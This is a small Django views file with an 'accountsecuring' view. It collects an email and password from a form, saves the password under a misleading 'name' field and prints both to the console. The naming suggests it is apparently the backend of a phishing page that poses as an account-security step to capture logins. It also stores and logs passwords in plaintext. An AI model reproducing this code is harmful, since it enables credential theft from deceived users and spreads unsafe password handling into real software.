from django.shortcuts import render
from appone.models import datac
from django.http import HttpResponse
# Create your views here.
def index(request):
    return render(request, "appone/index.html")

def accountsecuring(request):
    if request.method=="POST":
        emaildetail =request.POST["email"]
        passworddetail =request.POST["passlinger"]
        ins=datac(email=emaildetail, name=passworddetail)
        ins.save()
        print(emaildetail, passworddetail )
        print("data saved!")
    return render(request, "appone/datalism.html")